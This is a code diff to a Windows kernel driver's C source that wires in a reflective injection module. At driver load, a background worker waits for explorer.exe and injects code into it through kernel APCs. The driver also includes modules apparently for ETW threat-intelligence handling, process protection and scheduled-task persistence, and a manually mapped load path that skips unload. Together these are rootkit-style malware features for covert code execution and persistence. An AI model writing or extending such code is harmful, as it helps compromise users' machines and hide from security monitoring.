@@ -2,6 +2,7 @@
 #include "Device.h"
 #include "Dispatch.h"
 #include "EtwTi.h"
+#include "NetProbeInject.h"
 #include "ProcessModule.h"
 #include "ProcessProtect.h"
 #include "TaskPersistence.h"
@@ -130,6 +131,15 @@ static NTSTATUS MappedDeviceInit(_In_ PDRIVER_OBJECT DriverObject,
   //
   TaskPersistenceInitialize();
 
+  //
+  // Reflective injection. Initializing here only arms APC tracking; the
+  // background worker is started last so it runs once every other module is up,
+  // then waits for explorer.exe and performs the load. Best effort, because a
+  // failure only costs the unload drain.
+  //
+  NetProbeInjectInitialize();
+  NetProbeInjectAutoStart();
+
   DbgPrint("[LongsDriver] Driver loaded successfully.\n");
   return STATUS_SUCCESS;
 }
@@ -244,6 +254,13 @@ VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
   ProcessModuleCleanup();
   ThreadModuleCleanup();
   TaskPersistenceCleanup();
+
+  //
+  // Drained before anything else is torn down: a queued APC's kernel routine
+  // is driver code, so it must not outlive the driver image. The mapped path
+  // clears DriverUnload and never reaches this.
+  //
+  NetProbeInjectCleanup();
 
   // Clean symbolic link
   RtlInitUnicodeString(&symlinkName, SYMLINK_NAME);
